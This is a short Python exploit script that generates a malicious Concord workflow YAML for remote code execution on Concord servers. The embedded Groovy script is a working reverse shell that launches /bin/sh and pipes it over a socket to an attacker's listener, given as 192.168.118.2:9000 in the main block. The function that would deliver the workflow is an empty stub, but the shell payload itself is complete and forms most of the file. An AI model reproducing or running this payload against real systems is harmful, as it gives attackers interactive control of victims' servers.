"""
Author: Aleksa Zatezalo
Description: Obtains RCE on Concord servers through RCE.
Date: March 2024
"""


def printLog(message):
    """
    Logs the string, message, to console with the appendage '[+] '.
    """

    pass

def constructYaml(lhost, lport):
    """
    Constructs a YAML file containing a workflow and RCE where lhost and lport are the
    ip and ports of the listener for an interactive shell found at lhost:lport.
    """
    
    yaml_template = f'''configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "{lhost}";
         int port = {lport};
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {{
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {{
            p.exitValue();
            break;
         }} catch (Exception e) {{}}
         }};
         p.destroy();
         s.close();
'''
    
    return yaml_template

def obtainRCE(yaml, rhost):
    """
    Takes a yaml file containing an infected process and obtains RCE on the Concord
    remote host, rhost, by creating an infected workflow.
    """

    pass

if __name__ == "__main__":
    print(constructYaml("192.168.118.2", 9000))